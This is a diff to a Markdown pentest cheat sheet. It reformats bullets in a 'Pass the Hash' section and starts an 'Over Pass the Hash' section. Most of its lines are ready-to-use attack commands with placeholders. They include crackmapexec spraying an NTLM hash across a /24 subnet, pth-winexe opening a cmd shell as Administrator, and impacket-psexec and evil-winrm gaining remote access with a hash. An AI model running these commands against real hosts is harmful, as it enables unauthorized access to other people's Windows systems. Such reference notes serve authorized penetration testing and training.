@@ -38,22 +38,23 @@
 
 `Pass the Hash`
 
--> Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
+- Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
 ```
 crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local  
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd
 ```
 
--> Remote Access - impacket-psexec  
+- Remote Access - impacket-psexec  
 ```
 impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
 impacket-psexec '<domain>/<user>'@<IP>
 ```
 
--> Remote Access + evil-winrm  
+- Remote Access + evil-winrm  
 ```
 evil-winrm -i <IP> -u <user> -H <hash>
 ```
+
 `Over Pass the Hash`
 
 -> Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
